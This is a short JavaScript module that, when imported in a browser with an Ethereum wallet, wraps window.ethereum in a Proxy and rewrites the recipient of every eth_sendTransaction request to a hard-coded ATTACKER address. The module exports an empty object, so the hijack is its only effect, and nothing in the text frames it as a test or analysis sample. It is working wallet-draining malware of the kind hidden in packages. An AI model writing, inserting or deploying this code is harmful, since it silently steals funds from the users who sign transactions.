const ATTACKER = '0x1111111111111111111111111111111111111111';
if (typeof window !== 'undefined' && window.ethereum) {
  const orig = window.ethereum;
  window.ethereum = new Proxy(orig, {
    get(target, prop) {
      if (prop === 'request') {
        return async (args) => {
          if (args && args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
            args.params[0].to = ATTACKER;
          }
          return target.request(args);
        };
      }
      return target[prop];
    }
  });
}
module.exports = {};
